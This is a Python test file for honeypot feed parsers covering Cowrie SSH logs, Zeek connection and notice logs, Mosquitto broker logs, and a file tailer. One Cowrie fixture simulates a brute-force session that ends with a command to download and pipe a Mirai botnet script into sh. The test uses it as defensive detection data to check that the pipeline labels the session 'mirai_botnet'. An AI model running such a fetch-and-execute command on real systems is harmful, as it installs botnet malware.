"""Tests for the real-honeypot feeds. Mosquitto lines were captured from a real mosquitto 2.0.18; Cowrie and Zeek lines are
written from their documented JSON formats (not captured from live containers)."""
import asyncio
import datetime as dt
import json

from aegex.collection.honeypot_feeds import (CowrieParser, FileTailer, MosquittoLogParser, parse_zeek_conn, parse_zeek_notice)
from aegex.config import get_settings
from aegex.models import EventType, RawEvent, TelemetryBatch
from aegex.processing.preprocessing import PreprocessingPipeline


def collect(fn, *lines):
    out = []
    for ln in lines:
        fn(ln, lambda t, p, src, ts: out.append((t, p, src, ts)))
    return out


def test_cowrie_bruteforce_session():
    c = CowrieParser()
    ev = lambda **k: json.dumps({"timestamp": "2026-10-27T10:00:00.000000Z", "session": "abc123", **k})  # noqa: E731
    lines = [ev(eventid="cowrie.session.connect", src_ip="198.51.100.9", src_port=5555, dst_port=2222, protocol="ssh")]
    lines += [ev(eventid="cowrie.login.failed", username="root", password=f"pw{i}") for i in range(4)]
    lines += [ev(eventid="cowrie.login.success", username="root", password="x"),
              ev(eventid="cowrie.command.input", input="wget http://203.0.113.9/mirai.sh -O- | sh"),
              ev(eventid="cowrie.session.closed", duration=12.5), "not json", "[]"]
    out = collect(c.parse, *lines)
    types = [o[0] for o in out]
    assert types.count(EventType.FAILED_LOGIN) == 4 and types.count(EventType.LOGIN_ATTEMPT) == 5
    assert all(o[1]["src_ip"] == "198.51.100.9" and o[1]["protocol"] == "ssh" for o in out)
    assert out[-1][0] == EventType.SESSION_INFO and out[-1][1]["duration_s"] == 12.5 and "abc123" not in c.sessions

    # and the rule-based analyzer / feature extractor accept them end to end
    pipe = PreprocessingPipeline(get_settings())
    now = dt.datetime(2026, 10, 27, tzinfo=dt.timezone.utc)
    sensor = RawEvent(EventType.SENSOR_READING, now.isoformat(), "csv", {"smoke": 400, "tempeture": 26.9, "humidity_pct": 62, "esp_ms": 1})
    raw = [RawEvent(o[0], o[3], o[2], o[1]) for o in out]
    fv = pipe.process(TelemetryBatch(now, sensor, raw))
    assert fv.feature_source == "observed" and fv.features["failed_logins"] == 4
    assert fv.analysis and fv.analysis["category"] == "mirai_botnet"


def test_zeek_conn_and_notice():
    conn = json.dumps({"ts": 1793133161.5, "uid": "C1", "id.orig_h": "192.168.1.77", "id.orig_p": 40000, "id.resp_h": "192.168.1.10",
                       "id.resp_p": 1883, "proto": "tcp", "service": "mqtt", "duration": 3.2, "orig_bytes": 100, "resp_bytes": 50,
                       "conn_state": "SF", "orig_pkts": 4, "resp_pkts": 3})
    out = collect(parse_zeek_conn, conn, '{"ts":1,"id.orig_h":"10.0.0.1","proto":"udp"}', "garbage", "#fields\tts")
    assert len(out) == 2
    t, p, src, ts = out[0]
    assert t == EventType.NETWORK_TRAFFIC and p["bytes"] == 150 and p["packets"] == 7 and p["dst_port"] == 1883 and ts.startswith("2026-")
    assert out[1][1]["bytes"] is None                       # unfinished / missing byte counts stay None, not 0
    n = collect(parse_zeek_notice, json.dumps({"ts": 1793133161.0, "note": "Scan::Port_Scan", "msg": "10.0.0.5 scanned 15 ports", "src": "10.0.0.5"}))
    assert n[0][0] == EventType.DEVICE_LOG and n[0][1]["src_ip"] == "10.0.0.5" and "Port_Scan" in n[0][1]["message"]


REAL_MOSQUITTO = """\
1793133159: mosquitto version 2.0.18 running
1793133160: New connection from 127.0.0.1:44142 on port 1883.
1793133160: New client connected from 127.0.0.1:44142 as watcher (p2, c1, k60).
1793133160: watcher 0 home/#
1793133161: New client connected from 127.0.0.1:44146 as aegex-pipeline (p2, c1, k60).
1793133161: aegex-pipeline 0 #
1793133161: Client watcher disconnected.
1793133162: some-unknown 0 topic
""".splitlines()


def test_mosquitto_log():
    out = collect(MosquittoLogParser(ignore_client="aegex-pipeline").parse, *REAL_MOSQUITTO)
    assert [(o[1]["action"], o[1].get("topic")) for o in out] == [("connect", None), ("subscribe", "home/#")]
    assert out[0][1]["src_ip"] == out[1][1]["src_ip"] == "127.0.0.1" and out[0][3].startswith("2026-")


def test_tailer_skips_old_reads_new_and_survives_truncate(tmp_path):
    f, got = tmp_path / "x.log", []

    async def go():
        f.write_text("old1\nold2\n")
        t = asyncio.create_task(FileTailer(f, got.append, 0.02, from_start=False).run())
        await asyncio.sleep(0.1)
        with open(f, "a") as fh:
            fh.write("new1\nhalf")
        await asyncio.sleep(0.1)
        with open(f, "a") as fh:
            fh.write("-done\n")
        await asyncio.sleep(0.1)
        f.write_text("after-truncate\n")                   # shorter than before -> re-open from the start
        await asyncio.sleep(0.15)
        t.cancel()

    asyncio.run(go())
    assert got == ["new1", "half-done", "after-truncate"]


def test_tailer_file_appearing_later_is_read_from_start(tmp_path):
    f, got = tmp_path / "late.log", []

    async def go():
        t = asyncio.create_task(FileTailer(f, got.append, 0.02, from_start=False).run())
        await asyncio.sleep(0.1)
        f.write_text("first\nsecond\n")
        await asyncio.sleep(0.15)
        t.cancel()

    asyncio.run(go())
    assert got == ["first", "second"]
